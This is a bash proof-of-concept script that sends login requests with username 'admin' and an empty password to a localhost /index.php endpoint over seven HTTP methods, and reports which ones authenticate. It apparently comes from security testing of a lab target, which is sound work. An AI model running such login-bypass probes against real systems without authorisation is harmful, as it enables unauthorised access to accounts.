#!/bin/bash

# POC: Missing HTTP Method Validation on Authentication Endpoint
# This script demonstrates that the /index.php endpoint accepts authentication
# requests using ANY HTTP method (GET, POST, PUT, DELETE, OPTIONS), violating
# REST principles and expanding the attack surface.

TARGET="http://localhost:3000/index.php"
USERNAME="admin"
PASSWORD=""  # Using empty password bypass for testing

echo "=========================================="
echo "HTTP Method Validation Bypass POC"
echo "=========================================="
echo "Target: $TARGET"
echo "Testing authentication with various HTTP methods..."
echo ""

# Array of HTTP methods to test
METHODS=("GET" "POST" "PUT" "DELETE" "OPTIONS" "PATCH" "HEAD")

SUCCESS_COUNT=0
TOTAL_TESTS=${#METHODS[@]}

for METHOD in "${METHODS[@]}"; do
    echo "----------------------------------------"
    echo "Testing with HTTP Method: $METHOD"
    echo "----------------------------------------"
    
    # Send request with the specified HTTP method
    RESPONSE=$(curl -s -X "$METHOD" "${TARGET}?username=${USERNAME}&password=${PASSWORD}" 2>&1)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "$METHOD" "${TARGET}?username=${USERNAME}&password=${PASSWORD}" 2>&1)
    
    echo "HTTP Status Code: $HTTP_CODE"
    
    # Check if authentication succeeded (looking for "Welcome Admin")
    if echo "$RESPONSE" | grep -qi "Welcome Admin"; then
        echo "Result: ✓ AUTHENTICATION SUCCESSFUL"
        echo "Response contains: 'Welcome Admin'"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    elif echo "$RESPONSE" | grep -qi "admin"; then
        echo "Result: ✓ REQUEST PROCESSED (contains 'admin')"
        echo "Response snippet: $(echo "$RESPONSE" | grep -i "admin" | head -n 1 | cut -c1-80)"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    else
        echo "Result: ✗ Method rejected or failed"
        echo "Response snippet: $(echo "$RESPONSE" | head -c 100)"
    fi
    
    echo ""
done

echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo "Total methods tested: $TOTAL_TESTS"
echo "Methods that succeeded: $SUCCESS_COUNT"
echo ""

if [ $SUCCESS_COUNT -ge 4 ]; then
    echo "VULNERABILITY CONFIRMED!"
    echo "The application accepts authentication requests via multiple"
    echo "HTTP methods without validation. This violates REST principles"
    echo "and expands the attack surface."
    echo ""
    echo "Expected behavior: Only GET (or preferably POST) should be accepted"
    echo "Actual behavior: Multiple methods (GET, POST, PUT, DELETE, etc.) work"
    exit 0
else
    echo "VULNERABILITY NOT CONFIRMED"
    echo "The application appears to validate HTTP methods properly."
    exit 1
fi